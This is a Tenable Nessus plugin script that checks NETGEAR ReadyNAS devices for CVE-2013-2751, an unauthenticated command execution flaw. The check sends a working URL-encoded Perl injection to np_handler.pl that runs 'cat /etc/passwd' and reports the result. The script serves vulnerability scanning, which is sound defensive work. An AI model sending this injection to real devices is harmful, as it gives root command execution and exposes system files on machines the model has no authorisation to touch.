#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(70585);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/05/24 13:36:52 $");

  script_cve_id("CVE-2013-2751");
  script_bugtraq_id(62059);
  script_osvdb_id(98826);
  script_xref(name:"EDB-ID", value:"29815");

  script_name(english:"NETGEAR ReadyNAS Remote Unauthenticated Command Execution");
  script_summary(english:"Attempts to get contents of /etc/passwd.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote NETGEAR ReadyNAS device is affected by a flaw in the
np_handler.pl script that allows an unauthenticated, remote attacker
to execute arbitrary commands with root privileges.");
  script_set_attribute(attribute:"see_also", value:"http://www.readynas.com/?p=7002");
  # http://www.tripwire.com/state-of-security/vulnerability-management/readynas-flaw-allows-root-access-unauthenticated-http-request/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?aea7a16f");
  script_set_attribute(attribute:"solution", value:
"Upgrade the software on the device to version 4.2.24 or higher.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'NETGEAR ReadyNAS Perl Code Evaluation');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/10/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/07/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/10/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:netgear:raidiator");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:netgear:readynas_raidiator");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("netgear_www_detect.nbin");
  script_require_keys("installed_sw/Netgear WWW");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("http.inc");

get_install_count(app_name:"Netgear WWW", exit_if_zero:TRUE);
port = get_http_port(default:443, embedded:TRUE);
install = get_single_install(app_name:"Netgear WWW", port:port);

# ReadyNAS uses Apache Web Server
server_header = http_server_header(port:port);
if ('Apache' >!< server_header) audit(AUDIT_WRONG_WEB_SERVER, port, 'Apache');

# see if we can access vulnerable script
res = http_send_recv3(port:port, method:"GET", item:"/np_handler/", exit_on_fail:TRUE);

if("<payload>Empty No Support</payload>" >!< res[2])
  audit(AUDIT_LISTEN_NOT_VULN, "Apache Web Server", port);

exploit_req = "/np_handler/np_handler.pl?PAGE=User&OPERATION=get&OUTER_TAB=tab_myshares&" +
              "addr=%22%29%3b$xml_payload_header=%28%60cat%20/etc/passwd%60.%22";

res = http_send_recv3(port:port, method:"GET", item:exploit_req, exit_on_fail:TRUE);

if(res[2] =~ "root:.*:0:[01]:" && "ReadyNAS" >< res[2])
{
  security_report_v4(
    port: port,
    severity: SECURITY_HOLE,
    cmd: "cat /etc/passwd",
    request: make_list(build_url(qs:exploit_req, port:port)),
    output: res[2]);
}
else audit(AUDIT_LISTEN_NOT_VULN, "ReadyNAS Web Server", port);
